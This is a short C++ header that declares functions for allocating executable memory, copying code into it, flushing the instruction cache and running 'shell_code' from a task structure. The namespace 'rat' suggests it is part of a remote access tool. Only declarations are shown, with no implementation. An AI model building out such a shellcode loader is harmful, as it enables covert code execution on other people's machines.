#include <stdexcept>
#include <cstring>
#include "rat/system/types.hpp"

namespace rat::system::rawdogger {

bool allocateExecutableBuffer(size_t arg_Size, void** p2_Buffer);

bool releaseExecutableBuffer(void* p_Buffer, size_t arg_Size) noexcept;


bool flushInstructionCache(void* p_Buffer, size_t arg_Size);


bool copyToExecutableBuffer(void* p_Exec_Buffer, const uint8_t* p_Code, size_t arg_Size);


bool executeBinaryCodeTask(BinaryCodeTask& Binary_Code_Task);
/*This function takes ownership of the parameters and the shell_code fields (fress it) and write into the reponse_buffer*/

}
